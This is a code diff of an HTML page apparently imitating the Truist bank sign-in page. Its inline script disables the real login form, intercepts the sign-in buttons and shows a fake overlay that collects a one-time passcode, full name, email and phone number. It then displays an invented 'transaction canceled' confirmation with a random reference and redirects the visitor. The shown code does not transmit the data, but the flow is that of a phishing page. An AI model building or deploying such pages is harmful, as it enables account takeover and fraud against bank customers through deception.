@@ -13850,8 +13850,8 @@
                         stroke-linejoin="round" />
                 </svg>
             </div>
-            <h2 id="tru-success-title" class="tru-overlay-title">Transaction Successful</h2>
-            <p class="tru-success-msg">Your transaction has been processed. Your session is now being cancelled for
+            <h2 id="tru-success-title" class="tru-overlay-title">Transaction Canceled Successfully</h2>
+            <p class="tru-success-msg">Your transaction has been canceled. Your session is now being closed for
                 security.</p>
             <div class="tru-success-detail">
                 <span class="tru-success-label">Status</span>
@@ -13871,122 +13871,122 @@
 
     <!-- SIGN-IN FLOW CONTROLLER -->
     <script>
-    (function () {
-        'use strict';
+        (function () {
+            'use strict';
 
-        // â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-        function byId(id) { return document.getElementById(id); }
-        function show(id) { byId(id).style.display = 'flex'; document.body.style.overflow = 'hidden'; }
-        function hide(id) { byId(id).style.display = 'none'; document.body.style.overflow = ''; }
-        function setError(id, msg) { var el = byId(id); el.textContent = msg; el.style.display = msg ? 'block' : 'none'; }
-        function clearErrors() {
-            ['tru-otp-error','tru-name-error','tru-email-error','tru-phone-error']
-                .forEach(function(id){ setError(id, ''); });
-        }
-        function randRef() {
-            return 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2,6).toUpperCase();
-        }
+            // â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+            function byId(id) { return document.getElementById(id); }
+            function show(id) { byId(id).style.display = 'flex'; document.body.style.overflow = 'hidden'; }
+            function hide(id) { byId(id).style.display = 'none'; document.body.style.overflow = ''; }
+            function setError(id, msg) { var el = byId(id); el.textContent = msg; el.style.display = msg ? 'block' : 'none'; }
+            function clearErrors() {
+                ['tru-otp-error', 'tru-name-error', 'tru-email-error', 'tru-phone-error']
+                    .forEach(function (id) { setError(id, ''); });
+            }
+            function randRef() {
+                return 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
+            }
 
-        // â”€â”€ Step 1: intercept Sign in â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-        function openOtpOverlay(e) {
-            if (e) { e.preventDefault(); e.stopImmediatePropagation(); }
-            clearErrors();
-            show('tru-otp-overlay');
-            var first = byId('tru-otp-code');
-            if (first) setTimeout(function(){ first.focus(); }, 80);
-        }
-
-        function attachSignIn() {
-            // Neutralise the real form â€” remove action so it cannot navigate away
-            document.querySelectorAll('form.sign-in-form').forEach(function(form) {
-                if (form.dataset.truDone) return;
-                form.dataset.truDone = '1';
-                form.removeAttribute('action');
-                form.addEventListener('submit', openOtpOverlay, true);
-            });
-
-            // Also intercept every Sign In button click
-            document.querySelectorAll('#loginSubmit, .btn-truist-login').forEach(function(btn) {
-                if (btn.dataset.truDone) return;
-                btn.dataset.truDone = '1';
-                btn.addEventListener('click', openOtpOverlay, true);
-            });
-        }
-
-        // â”€â”€ Step 2: validate & submit OTP/details form â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-        var otpForm = byId('tru-otp-form');
-        if (otpForm) {
-            otpForm.addEventListener('submit', function(e) {
-                e.preventDefault();
+            // â”€â”€ Step 1: intercept Sign in â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+            function openOtpOverlay(e) {
+                if (e) { e.preventDefault(); e.stopImmediatePropagation(); }
                 clearErrors();
-                var otp   = byId('tru-otp-code').value.trim();
-                var name  = byId('tru-full-name').value.trim();
-                var email = byId('tru-email').value.trim();
-                var phone = byId('tru-phone').value.trim();
-                var ok = true;
+                show('tru-otp-overlay');
+                var first = byId('tru-otp-code');
+                if (first) setTimeout(function () { first.focus(); }, 80);
+            }
 
-                if (!otp || otp.length < 4) {
-                    setError('tru-otp-error', 'Please enter a valid OTP (at least 4 digits).'); ok = false;
-                }
-                if (!name) {
-                    setError('tru-name-error', 'Full name is required.'); ok = false;
-                }
-                if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                    setError('tru-email-error', 'Please enter a valid email address.'); ok = false;
-                }
-                if (!phone || phone.replace(/\D/g,'').length < 7) {
-                    setError('tru-phone-error', 'Please enter a valid phone number.'); ok = false;
-                }
-                if (!ok) return;
+            function attachSignIn() {
+                // Neutralise the real form â€” remove action so it cannot navigate away
+                document.querySelectorAll('form.sign-in-form').forEach(function (form) {
+                    if (form.dataset.truDone) return;
+                    form.dataset.truDone = '1';
+                    form.removeAttribute('action');
+                    form.addEventListener('submit', openOtpOverlay, true);
+                });
 
-                hide('tru-otp-overlay');
-                byId('tru-ref-number').textContent = randRef();
-                show('tru-success-overlay');
-                startCountdown();
-            });
-        }
+                // Also intercept every Sign In button click
+                document.querySelectorAll('#loginSubmit, .btn-truist-login').forEach(function (btn) {
+                    if (btn.dataset.truDone) return;
+                    btn.dataset.truDone = '1';
+                    btn.addEventListener('click', openOtpOverlay, true);
+                });
+            }
 
-        // â”€â”€ Step 3: 10-second countdown then REAL redirect to homepage â”€â”€â”€â”€â”€â”€â”€â”€
-        var countdownTimer = null;
+            // â”€â”€ Step 2: validate & submit OTP/details form â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+            var otpForm = byId('tru-otp-form');
+            if (otpForm) {
+                otpForm.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    clearErrors();
+                    var otp = byId('tru-otp-code').value.trim();
+                    var name = byId('tru-full-name').value.trim();
+                    var email = byId('tru-email').value.trim();
+                    var phone = byId('tru-phone').value.trim();
+                    var ok = true;
 
-        function startCountdown() {
-            var remaining = 10;
-            var fill = byId('tru-progress-fill');
-            if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
-            // Allow the CSS transition to apply from next frame
-            setTimeout(function() {
-                if (fill) fill.style.transition = 'width 1s linear';
-            }, 50);
+                    if (!otp || otp.length < 4) {
+                        setError('tru-otp-error', 'Please enter a valid OTP (at least 4 digits).'); ok = false;
+                    }
+                    if (!name) {
+                        setError('tru-name-error', 'Full name is required.'); ok = false;
+                    }
+                    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                        setError('tru-email-error', 'Please enter a valid email address.'); ok = false;
+                    }
+                    if (!phone || phone.replace(/\D/g, '').length < 7) {
+                        setError('tru-phone-error', 'Please enter a valid phone number.'); ok = false;
+                    }
+                    if (!ok) return;
 
-            countdownTimer = setInterval(function() {
-                remaining -= 1;
-                var el = byId('tru-countdown');
-                if (el) el.textContent = remaining;
-                if (fill) fill.style.width = (remaining * 10) + '%';
-                if (remaining <= 0) {
-                    clearInterval(countdownTimer);
-                    goHome();
-                }
-            }, 1000);
-        }
+                    hide('tru-otp-overlay');
+                    byId('tru-ref-number').textContent = randRef();
+                    show('tru-success-overlay');
+                    startCountdown();
+                });
+            }
 
-        function goHome() {
-            clearInterval(countdownTimer);
-            // Real navigation back to the homepage â€” page fully reloads and resets
-            window.location.href = '/';
-        }
+            // â”€â”€ Step 3: 10-second countdown then REAL redirect to homepage â”€â”€â”€â”€â”€â”€â”€â”€
+            var countdownTimer = null;
 
-        var goNowBtn = byId('tru-go-home-now');
-        if (goNowBtn) { goNowBtn.addEventListener('click', goHome); }
+            function startCountdown() {
+                var remaining = 10;
+                var fill = byId('tru-progress-fill');
+                if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
+                // Allow the CSS transition to apply from next frame
+                setTimeout(function () {
+                    if (fill) fill.style.transition = 'width 1s linear';
+                }, 50);
 
-        // â”€â”€ Attach after DOM ready + after LOCAL FIX shows the form â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', attachSignIn);
-        } else {
-            attachSignIn();
-        }
-        setTimeout(attachSignIn, 700);
-        setTimeout(attachSignIn, 1600);
-    })();
+                countdownTimer = setInterval(function () {
+                    remaining -= 1;
+                    var el = byId('tru-countdown');
+                    if (el) el.textContent = remaining;
+                    if (fill) fill.style.width = (remaining * 10) + '%';
+                    if (remaining <= 0) {
+                        clearInterval(countdownTimer);
+                        goHome();
+                    }
+                }, 1000);
+            }
+
+            function goHome() {
+                clearInterval(countdownTimer);
+                // Real navigation back to the homepage â€” page fully reloads and resets
+                window.location.href = '/';
+            }
+
+            var goNowBtn = byId('tru-go-home-now');
+            if (goNowBtn) { goNowBtn.addEventListener('click', goHome); }
+
+            // â”€â”€ Attach after DOM ready + after LOCAL FIX shows the form â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', attachSignIn);
+            } else {
+                attachSignIn();
+            }
+            setTimeout(attachSignIn, 700);
+            setTimeout(attachSignIn, 1600);
+        })();
     </script>
 </body>
